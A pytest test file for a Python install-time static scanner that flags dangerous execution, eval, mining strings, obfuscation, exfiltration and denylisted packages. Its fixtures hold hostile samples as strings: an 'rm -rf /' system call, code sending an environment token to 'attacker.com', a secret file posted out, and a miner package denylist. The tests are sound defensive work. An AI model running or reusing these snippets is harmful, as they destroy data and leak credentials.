"""Tests for the T5 install-time Python static scanner."""

from __future__ import annotations

from pathlib import Path

import pytest

from ultron.install.static_scanner import (
    DEFAULT_DENYLISTED_PACKAGES,
    DEFAULT_MAX_FILES,
    DEFAULT_MAX_FILE_BYTES,
    Finding,
    FindingSeverity,
    LineFindingKind,
    ScanReport,
    SourceFindingKind,
    scan_dependencies,
    scan_install_directory,
    scan_python_text,
)


# ----------------------------------------------------------------------
# scan_python_text — line rules


def test_dangerous_exec_subprocess_run_critical() -> None:
    src = "import subprocess\nsubprocess.run(['ls'])\n"
    findings = scan_python_text("f.py", src)
    assert any(
        f.severity == FindingSeverity.CRITICAL and f.kind == LineFindingKind.DANGEROUS_EXEC.value
        for f in findings
    )


def test_dangerous_exec_os_system_critical() -> None:
    src = "import os\nos.system('rm -rf /')\n"
    findings = scan_python_text("f.py", src)
    assert any(f.kind == LineFindingKind.DANGEROUS_EXEC.value for f in findings)


def test_dynamic_eval_critical() -> None:
    src = "x = eval(user_input)\n"
    findings = scan_python_text("f.py", src)
    assert any(f.kind == LineFindingKind.DYNAMIC_CODE_EXECUTION.value for f in findings)


def test_crypto_mining_keyword_critical() -> None:
    src = "POOL = 'stratum+tcp://pool.example.com:3333'\n"
    findings = scan_python_text("f.py", src)
    assert any(f.kind == LineFindingKind.CRYPTO_MINING.value for f in findings)


def test_clean_python_no_findings() -> None:
    src = "def add(a, b):\n    return a + b\n"
    findings = scan_python_text("f.py", src)
    assert findings == []


def test_subprocess_in_comment_not_flagged() -> None:
    # Comments are stripped before scanning.
    src = "# subprocess.run(['evil'])\nprint('hi')\n"
    findings = scan_python_text("f.py", src)
    assert findings == []


# ----------------------------------------------------------------------
# scan_python_text — source rules


def test_potential_exfiltration_file_plus_network() -> None:
    src = (
        "import requests\n"
        "with open('secret.txt') as f:\n"
        "    data = f.read()\n"
        "requests.post('https://example.com', data=data)\n"
    )
    findings = scan_python_text("f.py", src)
    assert any(f.kind == SourceFindingKind.POTENTIAL_EXFILTRATION.value for f in findings)


def test_obfuscated_hex_escapes() -> None:
    src = "PAYLOAD = '\\x48\\x65\\x6c\\x6c\\x6f\\x57\\x6f\\x72\\x6c\\x64\\x21\\x2a'\n"
    findings = scan_python_text("f.py", src)
    assert any(
        f.kind == SourceFindingKind.OBFUSCATED_CODE.value
        for f in findings
    )


def test_env_harvesting_critical() -> None:
    src = (
        "import os\nimport requests\n"
        "token = os.environ.get('SECRET_TOKEN')\n"
        "requests.post('https://attacker.com', json={'t': token})\n"
    )
    findings = scan_python_text("f.py", src)
    assert any(
        f.severity == FindingSeverity.CRITICAL
        and f.kind == SourceFindingKind.ENV_HARVESTING.value
        for f in findings
    )


def test_env_harvesting_no_network_no_finding() -> None:
    src = "import os\ntoken = os.environ['MY_KEY']\nprint(token)\n"
    findings = scan_python_text("f.py", src)
    assert all(f.kind != SourceFindingKind.ENV_HARVESTING.value for f in findings)


# ----------------------------------------------------------------------
# scan_install_directory


def test_scan_empty_dir_returns_empty_report(tmp_path: Path) -> None:
    report = scan_install_directory(tmp_path)
    assert report.files_scanned == 0
    assert report.findings == ()


def test_scan_dir_finds_dangerous_file(tmp_path: Path) -> None:
    bad = tmp_path / "evil.py"
    bad.write_text("import subprocess\nsubprocess.run(['x'])\n", encoding="utf-8")
    report = scan_install_directory(tmp_path)
    assert report.files_scanned >= 1
    assert report.has_critical


def test_scan_dir_skips_pycache(tmp_path: Path) -> None:
    cache = tmp_path / "__pycache__" / "evil.py"
    cache.parent.mkdir()
    cache.write_text("import subprocess\nsubprocess.run(['x'])\n", encoding="utf-8")
    report = scan_install_directory(tmp_path)
    assert report.files_scanned == 0


def test_scan_dir_caps_at_max_files(tmp_path: Path) -> None:
    for i in range(5):
        (tmp_path / f"f{i}.py").write_text("x = 1\n", encoding="utf-8")
    report = scan_install_directory(tmp_path, max_files=2)
    assert report.files_scanned == 2
    assert report.files_skipped >= 3


def test_scan_dir_skips_oversized_file(tmp_path: Path) -> None:
    big = tmp_path / "huge.py"
    big.write_text("x = 1\n" * 100000, encoding="utf-8")
    report = scan_install_directory(tmp_path, max_file_bytes=100)
    assert any(f.kind == SourceFindingKind.FILE_TOO_LARGE.value for f in report.findings)


def test_scan_dir_ignores_non_python_files(tmp_path: Path) -> None:
    (tmp_path / "readme.md").write_text("subprocess.run(['x'])", encoding="utf-8")
    report = scan_install_directory(tmp_path)
    assert report.files_scanned == 0


def test_scan_report_critical_count() -> None:
    report = ScanReport(
        findings=(
            Finding(path="a", severity=FindingSeverity.CRITICAL, kind="x"),
            Finding(path="b", severity=FindingSeverity.WARN, kind="y"),
            Finding(path="c", severity=FindingSeverity.CRITICAL, kind="z"),
        ),
    )
    assert report.critical_count == 2
    assert report.warn_count == 1
    assert report.has_critical is True


def test_scan_report_empty_has_no_critical() -> None:
    assert ScanReport().has_critical is False


# ----------------------------------------------------------------------
# Constants


def test_default_max_files_500() -> None:
    assert DEFAULT_MAX_FILES == 500


def test_default_max_bytes_1mb() -> None:
    assert DEFAULT_MAX_FILE_BYTES == 1024 * 1024


# ----------------------------------------------------------------------
# Dependency scanner


def test_scan_dependencies_finds_denylisted(tmp_path: Path) -> None:
    manifest = tmp_path / "requirements.txt"
    manifest.write_text("requests==2.31.0\nxmrig==1.0\n", encoding="utf-8")
    findings = scan_dependencies([manifest])
    assert any(f.package == "xmrig" for f in findings)


def test_scan_dependencies_ignores_safe(tmp_path: Path) -> None:
    manifest = tmp_path / "requirements.txt"
    manifest.write_text("requests==2.31.0\nnumpy==1.26.0\n", encoding="utf-8")
    findings = scan_dependencies([manifest])
    assert findings == ()


def test_scan_dependencies_extra_denylist(tmp_path: Path) -> None:
    manifest = tmp_path / "requirements.txt"
    manifest.write_text("custom-malware==1.0\n", encoding="utf-8")
    findings = scan_dependencies([manifest], extra_denylist=["custom-malware"])
    assert any(f.package == "custom-malware" for f in findings)


def test_scan_dependencies_handles_pep508_specifiers(tmp_path: Path) -> None:
    manifest = tmp_path / "requirements.txt"
    manifest.write_text("xmrig>=1.0,<2.0\n", encoding="utf-8")
    findings = scan_dependencies([manifest])
    assert any(f.package == "xmrig" for f in findings)


def test_scan_dependencies_strips_comments(tmp_path: Path) -> None:
    manifest = tmp_path / "requirements.txt"
    manifest.write_text("# this is a comment\nrequests==2.31.0\n", encoding="utf-8")
    findings = scan_dependencies([manifest])
    assert findings == ()


def test_default_denylist_includes_known_typosquats() -> None:
    assert "xmrig" in DEFAULT_DENYLISTED_PACKAGES
    assert "coinhive" in DEFAULT_DENYLISTED_PACKAGES
